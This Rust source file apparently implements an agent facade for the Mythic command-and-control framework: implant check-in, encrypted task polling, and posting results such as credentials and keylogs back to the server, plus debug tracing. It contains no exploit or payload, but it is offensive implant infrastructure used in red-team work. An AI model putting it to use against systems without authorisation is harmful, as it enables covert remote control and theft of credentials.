//! High-level agent facade — build, send, and parse Mythic protocol messages.

use alloc::string::String;
use alloc::vec::Vec;
use uuid::Uuid;

use crate::MythicResult;
use crate::error::MythicError;
use crate::protocol::checkin::{self, DirectResult};
use crate::protocol::codec::{
    Aes256HmacCrypto, decode_message, decode_message_plain, encode_message,
    encode_message_plain,
};
use crate::protocol::{ReqCheckin, ReqGetTasking, ReqPostResponse, RespGetTasking, RespPostResponse};
use crate::transport::C2Transport;

/// Post-checkin phase — holds the callback UUID assigned by Mythic.
///
/// # Examples
///
/// ```no_run
/// use mythic::{C2Transport, MythicAgent, ReqCheckin};
/// use uuid::Uuid;
///
/// # struct HttpC2;
/// # impl C2Transport for HttpC2 {
/// #     type Error = &'static str;
/// #     fn random_iv(&self) -> Result<[u8; 16], Self::Error> { Ok([0u8; 16]) }
/// #     fn checkin(&self, p: &str) -> Result<String, Self::Error> { Ok(String::new()) }
/// #     fn get_tasking(&self, p: &str) -> Result<String, Self::Error> { Ok(String::new()) }
/// #     fn post_response(&self, p: &str) -> Result<String, Self::Error> { Ok(String::new()) }
/// # }
/// let c2 = HttpC2;
/// let payload_uuid = Uuid::parse_str("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee").unwrap();
///
/// let mut agent = MythicAgent::new(payload_uuid);
/// let req = ReqCheckin::new(
///     payload_uuid,
///     vec!["10.0.0.1".into()],
///     Some("linux".into()),
///     None, None, None, None, None, None, None, None, None, None,
/// );
/// agent.checkin(req, &c2).unwrap();
/// println!("callback UUID: {}", agent.callback_uuid());
/// ```
#[derive(Debug)]
pub struct MythicAgent {
    pub callback_uuid: Uuid,
    crypto: Option<Aes256HmacCrypto>,

    /// Enable detailed trace capture.
    pub debug: bool,

    /// Last JSON payload serialized (pre-encryption).
    pub trace_json_sent: Option<String>,
    /// Last IV used, hex-encoded.
    pub trace_iv_hex: Option<String>,
    /// Last wire packet (base64) sent.
    pub trace_packet_sent: Option<String>,
    /// Last wire packet (base64) received.
    pub trace_packet_received: Option<String>,
    /// Last JSON payload deserialized (post-decryption).
    pub trace_json_received: Option<String>,
}

impl MythicAgent {
    pub fn new(callback_uuid: Uuid) -> Self {
        Self {
            callback_uuid,
            crypto: None,
            debug: false,
            trace_json_sent: None,
            trace_iv_hex: None,
            trace_packet_sent: None,
            trace_packet_received: None,
            trace_json_received: None,
        }
    }

    pub fn callback_uuid(&self) -> Uuid {
        self.callback_uuid
    }

    /// Whether the agent has negotiated an encryption key.
    pub fn is_encrypted(&self) -> bool {
        self.crypto.is_some()
    }

    // ── Core message flow ──────────────────────────────────────

    /// Perform a direct checkin (plaintext or static-key PSK).
    ///
    /// The mode is determined automatically from the transport
    /// via [`C2Transport::aes_psk`].  `req.uuid` must be the payload UUID;
    /// it is used both in the JSON body and the wire framing.
    pub fn checkin<C: C2Transport>(
        &mut self,
        req: ReqCheckin,
        c2: &C,
    ) -> MythicResult<()> {
        let payload_uuid = req.uuid;

        if self.debug {
            if let Ok(json) = serde_json::to_string(&req) {
                self.trace_json_sent = Some(json);
            }
        }

        let iv = c2.random_iv().map_err(|e| MythicError::transport(e))?;
        if self.debug {
            self.trace_iv_hex = Some(hex_fmt(&iv));
        }

        let DirectResult { callback_uuid, crypto, packet_sent, packet_received } =
            checkin::direct_checkin(c2, &req, payload_uuid, &iv)?;

        self.callback_uuid = callback_uuid;
        self.crypto = crypto;
        self.trace_packet_sent = Some(packet_sent);
        self.trace_packet_received = Some(packet_received);

        Ok(())
    }

    /// Poll for new tasks from the Mythic server.
    ///
    /// Trace fields are populated before the network call so they survive errors.
    pub fn get_tasking<C: C2Transport>(
        &mut self,
        tasking_size: u32,
        c2: &C,
    ) -> MythicResult<RespGetTasking> {
        let req = ReqGetTasking::new(tasking_size);

        if self.debug {
            if let Ok(json) = serde_json::to_string(&req) {
                self.trace_json_sent = Some(json);
            }
        }

        if let Some(ref crypto) = self.crypto {
            let iv = c2.random_iv().map_err(|e| MythicError::transport(e))?;

            if self.debug {
                self.trace_iv_hex = Some(hex_fmt(&iv));
            }

            let packed = encode_message(&req, self.callback_uuid, crypto, &iv)?;
            self.trace_packet_sent = Some(packed.clone());

            let response = c2
                .get_tasking(&packed)
                .map_err(|e| MythicError::transport(e))?;
            self.trace_packet_received = Some(response.clone());

            let (_, resp) = decode_message(&response, Some(self.callback_uuid), crypto)?;

            if self.debug {
                if let Ok(json) = serde_json::to_string(&resp) {
                    self.trace_json_received = Some(json);
                }
            }

            Ok(resp)
        } else {
            let packed = encode_message_plain(&req, self.callback_uuid)?;
            self.trace_packet_sent = Some(packed.clone());

            let response = c2
                .get_tasking(&packed)
                .map_err(|e| MythicError::transport(e))?;
            self.trace_packet_received = Some(response.clone());

            let (_, resp) = decode_message_plain(&response, Some(self.callback_uuid))?;
            Ok(resp)
        }
    }

    /// Send task responses back to the Mythic server.
    ///
    /// The `responses` vector contains the output of one or more completed (or
    /// in-progress) tasks.  Use [`crate::protocol::TaskResponse`] builders
    /// like [`crate::protocol::TaskResponse::completed`] or construct custom
    /// responses with hooking-feature data (file browser entries, credentials,
    /// keylogs, etc.).
    pub fn post_response<C: C2Transport>(
        &mut self,
        responses: Vec<crate::protocol::TaskResponse>,
        c2: &C,
    ) -> MythicResult<RespPostResponse> {
        let req = ReqPostResponse::new(responses);

        if self.debug {
            if let Ok(json) = serde_json::to_string(&req) {
                self.trace_json_sent = Some(json);
            }
        }

        if let Some(ref crypto) = self.crypto {
            let iv = c2.random_iv().map_err(|e| MythicError::transport(e))?;

            if self.debug {
                self.trace_iv_hex = Some(hex_fmt(&iv));
            }

            let packed = encode_message(&req, self.callback_uuid, crypto, &iv)?;
            self.trace_packet_sent = Some(packed.clone());

            let response = c2
                .post_response(&packed)
                .map_err(|e| MythicError::transport(e))?;
            self.trace_packet_received = Some(response.clone());

            let (_, resp) = decode_message(&response, Some(self.callback_uuid), crypto)?;

            if self.debug {
                if let Ok(json) = serde_json::to_string(&resp) {
                    self.trace_json_received = Some(json);
                }
            }

            Ok(resp)
        } else {
            let packed = encode_message_plain(&req, self.callback_uuid)?;
            self.trace_packet_sent = Some(packed.clone());

            let response = c2
                .post_response(&packed)
                .map_err(|e| MythicError::transport(e))?;
            self.trace_packet_received = Some(response.clone());

            let (_, resp) = decode_message_plain(&response, Some(self.callback_uuid))?;
            Ok(resp)
        }
    }

    // ── Debug ──────────────────────────────────────────────────

    /// Dump all trace fields to a human-readable string.
    pub fn debug_dump(&self) -> String {
        use alloc::fmt::Write;
        let mut s = String::new();
        let _ = writeln!(s, "── MythicAgent debug ──");
        let _ = writeln!(s, "callback_uuid: {}", self.callback_uuid);
        let _ = writeln!(s, "encrypted: {}", self.crypto.is_some());
        if let Some(ref iv) = self.trace_iv_hex {
            let _ = writeln!(s, "IV: {iv}");
        }
        if let Some(ref j) = self.trace_json_sent {
            let _ = writeln!(s, "JSON sent: {j}");
        }
        if let Some(ref j) = self.trace_json_received {
            let _ = writeln!(s, "JSON recv: {j}");
        }
        if let Some(ref p) = self.trace_packet_sent {
            let _ = writeln!(s, "Packet sent:\n  {p}");
        }
        if let Some(ref p) = self.trace_packet_received {
            let _ = writeln!(s, "Packet recv:\n  {p}");
        }
        s
    }
}

fn hex_fmt(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        let _ = core::fmt::Write::write_fmt(&mut s, format_args!("{b:02x}"));
    }
    s
}
